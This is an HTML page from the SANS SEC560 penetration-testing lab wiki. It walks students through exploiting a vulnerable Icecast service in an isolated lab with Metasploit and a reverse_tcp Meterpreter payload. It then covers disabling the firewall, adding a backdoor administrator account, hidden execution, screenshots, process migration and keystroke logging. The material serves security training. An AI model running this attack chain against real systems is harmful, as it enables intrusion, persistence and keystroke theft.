@@ -1,0 +1,628 @@
+<!DOCTYPE HTML>
+<!--
+    Editorial by HTML5 UP
+    html5up.net | @ajlkn
+    Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
+
+    560 Wiki made with love and care by the following people:
+    - Tim Medin (@TimMedin, @RedSiegeInfoSec) -- Project Lead, Red Siege Information Security
+    - Erik Van Buggenhout (@@ErikVaBu, @NVISOsecurity) -- Project Lead, NVISO Security
+    - Mick Douglas (@BetterSafetyNet) -- Tech lead, Intern Wrangler, InfoSec Innovations
+        - Yulli Chong -- Intern, InfoSec Innovations
+        - Aaron Sawyer (@CrashingStatic) -- Intern, InfoSec Innovations
+-->
+<html>
+    <head>
+        <title>SANS SEC560 Lab Wiki</title>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+        <link rel="stylesheet" href="css/main.css" />
+    </head>
+    <body>
+
+        <!-- Wrapper -->
+            <div id="wrapper">
+
+                <!-- Main -->
+                    <div id="main">
+                        <div class="inner">
+
+                            <!-- Header -->
+                                <header id="header">
+                                    <a href="index.html" class="logo">SANS SEC 560 Lab Wiki</a>
+                                    <ul class="icons">
+                                        <li><a href="https://twitter.com/search?q=Sec560" class="icon fa-twitter"><span class="label">Twitter</span></a></li>
+                                    </ul>
+                                </header>
+
+                            <!-- Content -->
+                            <!-- Converted Markdown body (AKA HTML stubs) goes here -->
+<h1 id="lab-32-meterpreter">Lab 3.2: Meterpreter</h1>
+<h2 id="objectives">Objectives</h2>
+<p>In this lab, we&rsquo;ll analyze the Meterpreter, using Metasploit to deliver this flexible payload to a vulnerable service that you put on your Windows machine temporarily. Specifically, we exploit the Icecast service (version 2.0.0), an internet multimedia streaming server that has a buffer overflow vulnerability. Our Metasploit payload will consist of the Meterpreter stage, loaded via the reverse_tcp stager, making a connection from the exploited box back to the attacker.</p>
+<h2 id="lab-steps">Lab Steps</h2>
+<p>You&rsquo;ll run this lab entirely on your own systems, with the vulnerable Icecast service on your Windows box getting exploited by your Linux virtual machine. On the slide, we depict Steps 1 through 4 of this lab. Note that throughout the entire lab, each of these step numbers will still apply.</p>
+<p><strong>Step 1</strong>: Configure Metasploit to exploit Icecast.</p>
+<p><strong>Step 2</strong>: Exploit the target service, sending the reverse_tcp stager as a payload with the Meterpreter stage.</p>
+<p><strong>Step 3</strong>: Use Meterpreter running inside Icecast&rsquo;s memory space, shoveling a reverse TCP connection back to the attacker.</p>
+<p><strong>Step 4</strong>: Interact with the Meterpreter running inside of the compromised machine&rsquo;s Icecast process.</p>
+<p><img  class="myImg"  src="pics/Ex3.2_img01.png" style="width:100%;max-width:600px"  alt="Overview" /></p>
+<h2 id="lab-setup">Lab Setup</h2>
+<p>For this lab, you&rsquo;ll attack your Windows machine, causing it to run the Meterpreter. Because we don't want anyone to exploit your Icecast process and control your Windows box, make sure your system is configured to use host-only networking.</p>
+<p>To switch to host-only networking, on your Host machine, you need to:</p>
+<ul>
+<li><p>Disconnect your Ethernet connection by unplugging your network cable and disabling any wireless activity.</p></li>
+<li><p>In VMware, make sure you have selected 'Host-only' networking (in VMware, go to VM &gt; Settings, select Network Adapter, and check Host-only).</p></li>
+</ul>
+<p><img  class="myImg"  src="pics/Ex3.2_img03.png" style="width:100%;max-width:600px"  alt="Switch to Host-only networking" /></p>
+<h3 id="ip-address-change">IP Address Change</h3>
+<blockquote>
+<h4 id="note-the-ip-addresses-of-your-systems-will-change-the-ip-address-shown-on-the-desktop-will-not-update-immediately-the-ip-address-from-the-command-line-will-always-be-correct">Note: The IP addresses of your systems will change! The IP address shown on the desktop will not update immediately. The IP address from the command line will always be correct.</h4>
+</blockquote>
+<h4 id="linux">Linux</h4>
+<p>You will need to renew your IP address by running the following commands:</p>
+<pre>
+sec560@slingshot~$ <b>sudo dhclient -r eth0</b>
+sec560@slingshot~$ <b>sudo dhclient eth0</b>
+</pre>
+
+<blockquote>
+<p>Note: You may see an error stating that SMB can't be restarted. You can safely ignore this error.</p>
+</blockquote>
+<p>Then find your new IP address by running <code>ifconfig</code>.</p>
+<pre>
+sec560@slingshot~$ <b>ifconfig</b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex3.2_img03b.png" style="width:100%;max-width:600px"  alt="Confirm Linux IP Address Change" /></p>
+<h4 id="windows">Windows</h4>
+<p>Your Windows host should detect the network change and get a new IP address automatically. To determine the new IP address, run the following command:</p>
+<pre>
+C:\> <b>ipconfig</b>
+</pre>
+
+<p>Write down your new Windows and Linux IP addresses.</p>
+<h5 id="disable-the-windows-firewall">Disable the Windows Firewall</h5>
+<p>To make sure this works properly, you may need to disable your Windows built-in firewall. Please run the command below from an elevated command prompt running with Administrator privileges, then verify that you can ping from Windows to Linux and from Linux to Windows:</p>
+<pre>
+C:\> <b>netsh advfirewall set allprofiles state off</b>
+
+C:\> <b>ping <i>YOUR_LINUX_IP_ADDRESS</i></b>
+</pre>
+
+<blockquote>
+<p><code>YOUR_LINUX_IP_ADDRESS</code> will likely be something similar to 192.168.X.X.</p>
+</blockquote>
+<p>Then, in Linux, run:</p>
+<pre>
+sec560@slingshot~$ <b>ping <i>YOUR_WINDOWS_IP_ADDRESS</i></b>
+</pre>
+
+<blockquote>
+<p><code>YOUR_WINDOWS_IP_ADDRESS</code> will likely be 192.168.X.X.</p>
+</blockquote>
+<p>If you can successfully ping with host-only networking, you are ready to begin.</p>
+<h2 id="lab--step-by-step-instructions">Lab &ndash; Step-by-Step Instructions</h2>
+<h4 id="step-1-metasploit-on-linux">Step 1: Metasploit on Linux</h4>
+<p>We&rsquo;ll move to our Linux virtual machine. Step 1 involves running Metasploit and configuring it to exploit the Icecast service. Launch Metasploit using the command below:</p>
+<pre>
+$ <b>msfconsole</b>
+</pre>
+
+<p>Note that your command prompt is now the Metasploit Framework console prompt (<code>msf5 &gt;</code>).</p>
+<p>Then search for the exploit associated with the Icecast service:</p>
+<pre>
+msf5 > <b>search icecast</b>
+</pre>
+
+<p>You should see an exploit for Windows called <code>icecast_header</code>, with a ranking of "great".</p>
+<p><img  class="myImg"  src="pics/Ex3.2_img08.png" style="width:100%;max-width:600px"  alt="Searching for Icecast in Metasploit" /></p>
+<p>We now choose the exploit. We&rsquo;ll use the Icecast Header buffer overflow exploit, which applies to the version of Icecast we installed:</p>
+<pre>
+msf5 > <b>use exploit/windows/http/icecast_header</b>
+</pre>
+
+<p>Note that our prompt has changed and now includes the name of the exploit we&rsquo;ve chosen.</p>
+<p>Next, we choose the payload to use in the exploit. We&rsquo;ve opted for a Meterpreter payload that will make a reverse TCP connection back to the attacker after it is running inside the vulnerable process:</p>
+<pre>
+msf5 exploit(windows/http/icecast_header) > <b>set PAYLOAD windows/meterpreter/reverse_tcp</b>
+</pre>
+
+<p>Next, let&rsquo;s look at the options that are associated with this exploit:</p>
+<pre>
+msf5 exploit(windows/http/icecast_header) > <b>show options</b>
+</pre>
+
+<p>We have to configure these options for our attack.</p>
+<p><img  class="myImg"  src="pics/Ex3.2_img09.png" style="width:100%;max-width:600px"  alt="Exploit options" /></p>
+<p>Again, the first option we&rsquo;ll set is the RHOST. This will be the IP address we want Metasploit to attack. We should enter the IP address of our Windows machine running the vulnerable Icecast service. Make sure you use the VMnet1 IP address you configured for your Windows machine:</p>
+<pre>
+msf5 exploit(windows/http/icecast_header) > <b>set RHOST <i>YOUR_WINDOWS_IP_ADDRESS</i></b>
+</pre>
+
+<blockquote>
+<p>Note: Don't type <code>YOUR_WINDOWS_IP_ADDRESS</code>; use your Windows IP address (e.g., 192.168.18.128).</p>
+</blockquote>
+<p>We need to tell Metasploit where it should configure the Meterpreter reverse shell to connect to. We want it to connect back to our Linux machine, so let&rsquo;s set it to do so:</p>
+<pre>
+msf exploit(windows/http/icecast_header) > <b>set LHOST <i>YOUR_LINUX_IP_ADDRESS</i></b>
+</pre>
+
+<blockquote>
+<p>Note: Don't type <code>YOUR_LINUX_IP_ADDRESS </code>; use your Windows IP address (e.g., 192.168.18.129).</p>
+</blockquote>
+<p>Metasploit is now configured. Let&rsquo;s review our Metasploit configuration:</p>
+<pre>
+msf exploit(windows/http/icecast_header) > <b>show options</b>
+</pre>
+
+<p>We&rsquo;re almost ready for the attack, but we have a little housekeeping to do first.</p>
+<p><img  class="myImg"  src="pics/Ex3.2_img10.png" style="width:100%;max-width:600px"  alt="Confirming the configuration" /></p>
+<p>We now need to invoke the Icecast server on our Windows machine.</p>
+<p><code>Right-click</code> the Icecast icon on your desktop and select <code>Run as administrator</code>.</p>
+<p><img  class="myImg"  src="pics/Ex3.2_img11.png" style="width:100%;max-width:600px"  alt="Run Icecast as Administrator" /></p>
+<p>When the GUI for Icecast appears, click the <code>Start Server</code> button. The Server Status indication should turn green and say "Running".</p>
+<p><img  class="myImg"  src="pics/Ex3.2_img12.png" style="width:100%;max-width:600px"  alt="Start Icecast" /></p>
+<p><img  class="myImg"  src="pics/Ex3.2_img12b.png" style="width:100%;max-width:600px"  alt="Icecast Running" /></p>
+<p>To make sure that Windows can reach our Linux machine with the reverse Meterpreter shell unfettered, let&rsquo;s also make sure that Windows can ping Linux. <strong>On your Windows machine at cmd.exe</strong>, run:</p>
+<pre>
+C:\> <b>ping <i>YOUR_LINUX_IP_ADDRESS</i></b>
+</pre>
+
+<blockquote>
+<p>Note: Don't type <code>YOUR_LINUX_IP_ADDRESS </code>; use your Windows IP address (e.g., 192.168.18.129).</p>
+</blockquote>
+<p>If the ping works successfully, we are ready to go. If it does not, double-check your network settings.</p>
+<h4 id="step-2-launch-the-attack">Step 2: Launch the attack</h4>
+<p>Let&rsquo;s launch the attack! On your Linux machine, at the msf prompt, simply type <code>exploit</code> and press <code>Enter</code>:</p>
+<pre>
+msf5 exploit(windows/http/icecast_header) > <b>exploit -z</b>
+</pre>
+
+<blockquote>
+<p>The <code>-z</code> options sends the session to the background.</p>
+</blockquote>
+<p>If the exploit is successful, you should see a message on Linux saying "Meterpreter session X created in the background".</p>
+<p><img  class="myImg"  src="pics/Ex3.2_img14.png" style="width:100%;max-width:600px"  alt="Successful exploitation of Icecast" /></p>
+<p>If the exploit works and you see "Session N created in the background", please move to Step 3 below.</p>
+<p>If it is not successful, keep in mind that when Metasploit exploits Icecast, there is a chance that Icecast could crash. Remember, most exploits have a certain probability of success, falling short of 100%. We chose to use the Icecast exploit because it has a higher probability of success, but it will sometimes crash the program.</p>
+<p>If you see a message on your Windows box that says Icecast has crashed, simply rerun it. You can do this by closing the Icecast GUI on Windows. Then rerun Icecast by double-clicking it on your Windows desktop. Click the Start Server button again, and watch for the Server Status box to turn green and say "Running".</p>
+<p>If Icecast did not crash but the exploit was unsuccessful, confirm that you have the correct <code>LHOST</code> IP address for your Linux system.</p>
+<p>Then, try running the <code>exploit</code> command again in the Metasploit console.</p>
+<h4 id="step-3-connecting-to-meterpreter">Step 3: Connecting to Meterpreter</h4>
+<blockquote>
+<p>Note step 3 in the overview is the exploit loading Meterpreter, so we will continue with Step 4.</p>
+</blockquote>
+<p>At the <code>msf &gt;</code> prompt, we ask Metasploit for an inventory of the connections it is managing for us between compromised systems and our machine. We can do this by asking for a list (<code>-l</code>, lowercase L) of sessions:</p>
+<pre>
+msf exploit(windows/http/icecast_header) > <b>sessions -l</b>
+</pre>
+
+<blockquote>
+<p>Note: That is a dash-lowercase-L, not a 1.</p>
+</blockquote>
+<p>Furthermore, note that Metasploit displays the detailed session information from our Windows machine connected back to our Linux machine.</p>
+<p>If your Metasploit command shell is not responsive, press <code>CTRL-C</code>. Then type in the <code>sessions -l</code> command.</p>
+<p>We now tell Metasploit that we want to interact (<code>-i</code>) with session number X. (We will use the session number that Metasploit assigned when the exploit worked successfully. The first session number is 1.)</p>
+<pre>
+msf exploit(windows/http/icecast_header) > <b>sessions -i 1</b>  
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex3.2_img15.png" style="width:100%;max-width:600px"  alt="Interacting with Meterpreter" /></p>
+<p>Our prompt now changes from the Metasploit prompt (msf) to the Meterpreter prompt:</p>
+<pre>
+meterpreter >
+</pre>
+
+<p>The Meterpreter is now ready for us to interact with it, accessing the victim machine.</p>
+<h4 id="step-4-meterpreter">Step 4: Meterpreter</h4>
+<p>As we move into Step 4 to interact with our Meterpreter session, let&rsquo;s review the architecture of what we are looking at. You are viewing your Meterpreter session on your Linux machine running Metasploit. That session is actually controlling your Windows machine, with the Meterpreter running inside of the Icecast process.</p>
+<p>With the Meterpreter running, let&rsquo;s explore the system a little bit. Run the following command:</p>
+<pre>
+meterpreter > <b>sysinfo</b>
+</pre>
+
+<p>This shows us our operating system type of the compromised machine.</p>
+<p>Now, let&rsquo;s determine our username on the victim box:</p>
+<pre>
+meterpreter > <b>getuid</b>
+</pre>
+
+<p>We should have the same username that you used to invoke the Icecast server because we are running from within its memory space.</p>
+<p>Next, let&rsquo;s look at the processes running on the screen:</p>
+<pre>
+meterpreter > <b>ps</b>
+</pre>
+
+<p>Look carefully for the process named Icecast2.exe. Make a note of its process ID number here:</p>
+<pre><code>Process ID for Icecast2.exe : _____________
+</code></pre>
+<p>And finally, let&rsquo;s look at the Meterpreter commands we have available:</p>
+<pre>
+meterpreter > <b>help</b>
+</pre>
+
+<p>Now let&rsquo;s explore some commands we have for interacting with the file system. First, we will navigate to the <code>c:\</code> directory. Note that in Meterpreter, you have to either use a forward slash (<code>/</code>) to refer to directory paths or use an escape sequence of a backslash to indicate a backslash (<code>\\</code>). So, to change to the <code>c:\</code> directory, please run:</p>
+<pre>
+    meterpreter > <b>cd c:\\</b>
+</pre>
+
+<p>Note that within the Meterpreter, you can also refer to <code>c:\</code> as <code>/</code>. So the commands <code>cd c:\\</code> and <code>cd /</code> do the same thing.</p>
+<p>Next, let&rsquo;s find out where we are in the directory structure. (Given that we just changed to <code>c:\</code>, we should be there.) The particular command depends on the version of the Meterpreter you are running. For some Meterpreter versions, the command is <code>pwd</code>. For others, it is <code>getcwd</code>. Run either of them. One or both should work:</p>
+<pre>
+meterpreter > <b>pwd</b>
+</pre>
+
+<p>Now let&rsquo;s get a directory listing:</p>
+<pre>
+meterpreter > <b>ls</b>
+</pre>
+
+<p>Sometimes what we want to accomplish on a target is easier completed with a simple Windows shell, such as cmd.exe, than it is within the Meterpreter. To support that kind of access, the Meterpreter includes the shell command, which executes a cmd.exe.</p>
+<p>You can see this convenient feature by executing the shell command from within the Meterpreter prompt:</p>
+<pre>
+meterpreter > <b>shell</b>
+</pre>
+
+<p>If this command fails, please skip ahead to after the next screenshot to see an alternative way to get shell from the Meterpreter prompt.</p>
+<p>If the shell command succeeds, you can now type whatever commands you would like inside of the cmd.exe:</p>
+<pre>
+C:\> <b>hostname</b>
+C:\> <b>ipconfig</b>
+C:\> <b>dir</b>
+</pre>
+
+<p>And so on. To exit your shell, simply type <code>exit</code>, and you should be back to the <code>meterpreter &gt;</code> prompt:</p>
+<pre>
+C:\> <b>exit</b>
+
+meterpreter >
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex3.2_img17.png" style="width:100%;max-width:600px"  alt="Meterpreter shell command" /></p>
+<p>If the <code>shell</code> command did not work for you, you can alternatively use the execute command to run a program. Let&rsquo;s run a cmd.exe command shell. We&rsquo;ll invoke it "channelized" with the <code>-c</code> option, which means that the Meterpreter will keep a communications session open with the executed program so that we can interact with it:</p>
+<pre>
+meterpreter > <b>execute -f cmd.exe -c</b>
+</pre>
+
+<blockquote>
+<p><strong>Note: Due to a small bug in Metasploit, you may see your Meterpreter prompt repeated on the screen again and again and again. That&rsquo;s ok. Just hit <code>CTRL-C</code> to restore your Meterpreter prompt to normal.</strong></p>
+</blockquote>
+<p>If the execution of the program is successful, the Meterpreter will tell us its process ID and the channel number we can use to interact with the process&rsquo;s Standard Input and Standard Output. We can perform such interaction using the interact command as follows:</p>
+<pre>
+    meterpreter > <b>channel -i <i>N</i></b>
+</pre>
+
+<p>The <code>N</code> should be replaced with the channel number (NOT THE PROCESS ID NUMBER) you saw in the output of the execute command.</p>
+<p><img  class="myImg"  src="pics/Ex3.2_img18.png" style="width:100%;max-width:600px"  alt="Meterpreter execute command" /></p>
+<p>You can now type whatever commands you would like inside of the cmd.exe:</p>
+<pre>
+C:\> <b>hostname</b>
+C:\> <b>ipconfig</b>
+C:\> <b>dir</b>
+</pre>
+
+<p>Let's now look at the users on the system.</p>
+<pre>
+C:\> <b>net user</b>
+</pre>
+
+<p>The output should look like this:</p>
+<pre>
+C:\> <b>net user</b>
+
+User accounts for \\SEC560STUDENT
+
+-------------------------------------------------------------------------------
+Administrator            DefaultAccount           fred
+Guest                    notadmin                 sec560
+student                  WDAGUtilityAccount
+The command completed successfully.
+</pre>
+
+<p>Let's create a backdoor account.</p>
+<blockquote>
+<p>Note: You will need to use a unique username. Do not type <i>BACKDOOR_USER</i>; instead, type your unique username. Please do not use offensive words or names.</p>
+</blockquote>
+<pre>
+C:\> <b>net user <i>BACKDOOR_USER</i> Password1 /add</b>
+The command executed successfully.
+</pre>
+
+<p>The above command will create a user with a password of <code>Password1</code>.</p>
+<p>Let's now confirm the user exists by running this command:</p>
+<pre>
+C:\> <b>net user <i>BACKDOOR_USER</i></b>
+</pre>
+
+<p>The output should look like this:</p>
+<pre>
+C:\> <b>net user <i>BACKDOOR_USER</i></b>
+User name                    backdoor
+Full Name
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            6/5/2019 3:42:37 AM
+Password expires             Never
+Password changeable          6/5/2019 3:42:37 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships      *Users
+Global Group memberships     *None
+The command completed successfully.
+</pre>
+
+<p>This account is more useful if it has administrative permissions, so let's make this account an administrator by running the command below:</p>
+<pre>
+C:\> <b>net localgroup administrators <i>BACKDOOR_USER</i> /add</b>
+The command executed successfully.
+</pre>
+
+<p>Let's now take a look at the members of the administrators group by running this command:</p>
+<pre>
+C:\> <b>net localgroup administrators</b>
+</pre>
+
+<p>The output should look like this:</p>
+<pre>
+C:\> <b>net localgroup administrators</b>
+
+Alias name     administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------
+Administrator
+<em>backdoor</em>
+fred
+sec560
+student
+The command completed successfully.
+</pre>
+
+<p>As we can see, our new account is an administrator!</p>
+<p>Let's remove the account, using the command below:</p>
+<pre>
+C:\> <b>net user <i>BACKDOOR_USER</i> /del</b>
+The command completed successfully.
+</pre>
+
+<p>We can confirm the deletion by running <code>net user</code> again. For the sake of space, the output isn't included here.</p>
+<p>To exit your shell, simply type <code>exit</code>, and you should be back to the <code>meterpreter &gt;</code> prompt:</p>
+<pre>
+C:\> <b>exit</b>
+
+meterpreter >
+</pre>
+
+<p>Note that the cmd.exe window appeared on the Windows GUI while it was running. To make the program run in a hidden mode, the execute command can be run with a <code>-H</code> option for "hidden".</p>
+<p>The execute command is nice and flexible in that it allows us to run any program we want, cmd.exe or otherwise, channelizing its Standard Input and Standard Output.</p>
+<p>Next, let&rsquo;s grab a screenshot of the exploited system:</p>
+<pre>
+meterpreter > <b>screenshot -p /tmp/screen.jpg</b>
+</pre>
+
+<p>Meterpreter will take the screenshot, which may take a few moments.</p>
+<p>Next, launch the Firefox browser in your Linux image (by clicking its icon on the top panel). In Firefox, go to the location of:</p>
+<pre>
+/tmp/my_screen.jpg
+</pre>
+
+<p>You should see your screenshot.</p>
+<p><img  class="myImg"  src="pics/Ex3.2_img20.png" style="width:100%;max-width:600px"  alt="Meterpreter screenshot" /></p>
+<p>We will now migrate the Meterpreter DLL on the exploited machine from one process to another. We&rsquo;ll jump from the Icecast2.exe process into a notepad.exe process on our Windows machine.</p>
+<p>Start by running Notepad on Windows from the Windows machine. (Do not invoke it from within the Meterpreter.) Go to the Start menu (or Windows menu) and run notepad.exe.</p>
+<p>Next, back within the Meterpreter, we get our current process ID number:</p>
+<pre>
+meterpreter > <b>getpid</b>
+</pre>
+
+<p>Now, get a process list to find the process ID of Notepad. We can use the <code>ps</code> command with a <code>-S</code> (capital S) option to search:</p>
+<pre>
+meterpreter > <b>ps -S notepad.exe</b>
+</pre>
+
+<pre><code>Make a note of the process ID number of notepad.exe here: _____________
+</code></pre>
+<p>Then, to jump into that process, we use the migrate command as follows:</p>
+<pre>
+meterpreter > <b>migrate <i>DESTINATION_PROCESS_ID</i></b>
+</pre>
+
+<blockquote>
+<p>For the <code>DESTINATION_PROCESS_ID</code>, use the process ID number of notepad.exe.</p>
+</blockquote>
+<p>Migration may take several seconds to work. If it is successful, you&rsquo;ll see a message saying so.</p>
+<p>If your migration fails (and it is likely that it may) you will have to re-establish your Meterpreter session. First, kill your existing session by typing <code>exit</code>. Then, make sure Icecast is running and simply run <code>exploit</code> again.</p>
+<p>If successful (no errors), look at your new process ID:</p>
+<pre>
+meterpreter > <b>getpid</b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex3.2_img22.png" style="width:100%;max-width:600px"  alt="Meterpreter getpid" /></p>
+<p>It should be the number associated with notepad.exe. If so, you just hopped between processes. Migration can be buggy. If the target process crashes, that&rsquo;s okay. You can exploit the target system again by exiting your dead Meterpreter session with a <code>CTRL-C</code> or <code>exit</code> command. Then restart Icecast. At your <code>msf &gt;</code> prompt, rerun the exploit <code>-z</code> command. Move to the next slide without migration.</p>
+<p>Even if migration failed, we can still activate the keystroke logger. Make sure Notepad is running (regardless of whether you are migrated to it). We will next invoke the keystroke logger in the Meterpreter. Start it by running:</p>
+<pre>
+meterpreter > <b>keyscan_start</b>
+</pre>
+
+<p>Then, in Windows, type some text into Notepad.</p>
+<p>Now go back to the Meterpreter and dump the captured keystrokes to the screen:</p>
+<pre>
+meterpreter > <b>keyscan_dump</b>
+</pre>
+
+<p>It should be noted that sometimes the keystroke logger misses keys or jumbles the order of keystrokes, especially when someone types rather quickly.</p>
+<p>Then stop the keystroke logger:</p>
+<pre>
+meterpreter > <b>keyscan_stop</b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex3.2_img23.png" style="width:100%;max-width:600px"  alt="Keyscan" /></p>
+<p>To finish the lab, you should cleanly exit the Meterpreter by typing:</p>
+<pre>
+meterpreter > <b>exit</b>
+</pre>
+
+<p>Then, to exit Metasploit, type:</p>
+<pre>
+msf exploit(windows/http/icecast_header) > <b>exit</b>
+</pre>
+
+<p>To finalize the lab, kill Notepad on Windows. Then let&rsquo;s stop Icecast.</p>
+<h2 id="networking">Networking</h2>
+<p>Change your Networking back to Bridged.</p>
+<p><img  class="myImg"  src="pics/Ex3.2_img24.png" style="width:100%;max-width:600px"  alt="Switch to Bridged networking" /></p>
+<h5 id="windows-your-windows-host-should-get-a-new-ip-address-relatively-quickly">Windows: Your Windows host should get a new IP address relatively quickly.</h5>
+<h5 id="linux-you-will-need-to-get-a-new-ip-address-after-switching-back-to-bridged-networking-by-running-the-following-commands">Linux: You will need to get a new IP address after switching back to Bridged networking by running the following commands.</h5>
+<pre>
+$ <b>sudo dhclient -r eth0</b>
+$ <b>sudo dhclient eth0</b>
+</pre>
+
+<h2 id="conclusion">Conclusion</h2>
+<p>In this lab, we saw a service-side exploit in use against a vulnerable listening service. By exploiting that flaw using Metasploit, we were able to load a Meterpreter payload with a reverse_tcp stager into the target machine&rsquo;s memory. We then explored numerous features of the Meterpreter, including its ability to explore the file system, run programs (such as a <code>shell</code>), provide channels of communication between a program&rsquo;s Standard Input and Standard Output, take screenshots, migrate processes, and log keystrokes. Truly, the Meterpreter is a very powerful payload component in the penetration tester&rsquo;s arsenal.</p>
+
+                        </div>
+                    </div>
+
+                <!-- Sidebar -->
+                    <div id="sidebar">
+                        <div class="inner">
+
+                            <!-- Search -->
+                            <!-- MBD 20180705 - Search feature is disabled for now.  Will enable it once we get OK
+                                <input type="text" name="query" id="query" placeholder="Search" />
+                                    <button onclick="myFunction()">?</button>
+                                        <script>
+                                        function myFunction() {
+                                                var x = document.getElementById("query").value;
+                                               var res =  idx.search(x);
+                                            alert(res);
+                                       </script>
+                            -->
+
+                            <!-- Menu -->
+                                <nav id="menu">
+                                    <header class="major">
+                                        <h2>Menu</h2>
+                                    </header>
+                                    <ul>
+                                        <li><a href="index.html">Homepage</a></li>
+                                        <li><a href="Getting-Started.html">Getting Started</a></li>
+                                        <li>
+                                            <span class="opener">Book 1:</span>
+                                            <ul>
+                                                <li><a href="Lab-1.1-Setting-Up-The-Image.html">Setting Up The Image</a></li>
+                                                <li><a href="Lab-1.2-Scope-and-RoE-Role-Play.html">Scope and RoE Role Play</a></li>
+                                                <li><a href="Lab-1.3-Metadata-Treasure-Hunt.html">Metadata Treasure Hunt</a></li>
+                                                <li><a href="Lab-1.4-Recon-ng-for-DNS-Analysis.html">Recon-ng for DNS Analysis</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 2:</span>
+                                            <ul>
+                                            	<li><a href="Lab-2.1-Nmap.html">Nmap</a></li>
+                                            	<li><a href="Lab-2.2-Nmap-O-sV.html">Nmap -O -sV</a></li>
+                                                <li><a href="Lab-2.3-NSE.html">NSE</a></li>
+                                                <li><a href="Lab-2.4-Nessus.html">Nessus</a></li>
+                                                <li><a href="Lab-2.5-Netcat.html">Netcat</a></li>
+                                                <li><a href="Lab-2.6-PowerShell.html">PowerShell</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 3:</span>
+                                            <ul>
+                                                <li><a href="Lab-3.1-Metasploit.html">Metasploit</a></li>
+                                                <li><a href="Lab-3.2-Meterpreter.html">Meterpreter</a></li>
+                                                <li><a href="Lab-3.3-Veil.html">Veil</a></li>
+                                                <li><a href="Lab-3.4-Port-Pivot-Relays.html">Port Pivot Relays</a></li>
+                                                <li><a href="Lab-3.5-Empire.html">Empire</a></li>
+                                                <li><a href="Lab-3.6-Running-Commands-with-sc-and-WMIC.html">Running Commands with sc and WMIC</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 4:</span>
+                                            <ul>
+                                                <li><a href="Lab-4.1-Hydra-Password-Guessing.html">Hydra Password Guessing</a></li>
+                                                <li><a href="Lab-4.2-MSF-psexec-hashdump-kiwi.html">MSF psexec, hash dumping, and Kiwi</a></li>
+                                                <li><a href="Lab-4.3-MSF-pivots.html">MSF Pivots</a></li>
+                                                <li><a href="Lab-4.4-Cracking-with-JtR-and-Hashcat.html">Cracking with John the Ripper and Hashcat</a></li>
+                                                <li><a href="Lab-4.5-Sniffing-Cracking.html">Sniffing & Cracking</a></li>
+                                                <li><a href="Lab-4.6-Pass-the-Hash.html">Pash the Hash</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 5:</span>
+                                            <ul>
+                                                <li><a href="Lab-5.1-Kerberos.html">Kerberos</a></li>
+                                                <li><a href="Lab-5.2-Responder.html">Responder</a></li>
+                                                <li><a href="Lab-5.3-Bloodhound.html">Bloodhound</a></li>
+                                                <li><a href="Lab-5.4-Privilege-Escalation.html">Privilege Escalation</a></li>
+                                                <li><a href="Lab-5.5-Domain-Dominance.html">Domain Dominance</a></li>
+                                                <li><a href="Lab-5.6-ZAP-Proxy.html">ZAP Proxy</a></li>
+                                                <li><a href="Lab-5.7-Command-Injection.html">Command Injection</a></li>
+                                                <li><a href="Lab-5.8-SQL-Injection.html">SQL Injection</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 6:</span>
+                                            <ul>
+                                                <li><a href="Lab-6.1a-Connecting-to-the-Network.html">Connecting to the Network</a></li>
+                                                <li><a href="Lab-6.1b-Online-CTF-Access.html">Online CTF Access</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Cheatsheets</span>
+                                            <ul>
+                                                <li><a href="other/MetsploitCheatsheet.pdf">Metasploit</a></li>
+                                                <li><a href="other/NetcatCheatSheetV1.pdf">Netcat</a></li>
+                                                <li><a href="other/WindowsCommandLineSheetV1.pdf">Windows Command Line</a></li>
+                                            </ul>
+                                        </li>
+                                    </ul>
+                                </nav>
+
+
+
+                            <!-- Footer -->
+                                <footer id="footer">
+                                    <p class="copyright">&copy; Tim Medin<br>
+                                        All rights reserved. <br>
+                                        Design: <a href="https://html5up.net">HTML5 UP</a>.</p>
+                                </footer>
+
+                        </div>
+                    </div>
+
+            </div>
+
+            <!-- The Modal -->
+            <div id="myModal" class="modal">
+                <span class="close">&times;</span>
+                <img class="modal-content" id="img01">
+                <div id="caption"></div>
+            </div>
+
+        <!-- Scripts -->
+            <script src="js/jquery.min.js"></script>
+            <script src="js/skel.min.js"></script>
+            <script src="js/util.js"></script>
+            <script src="js/main.js"></script>
+
+    </body>
+</html>
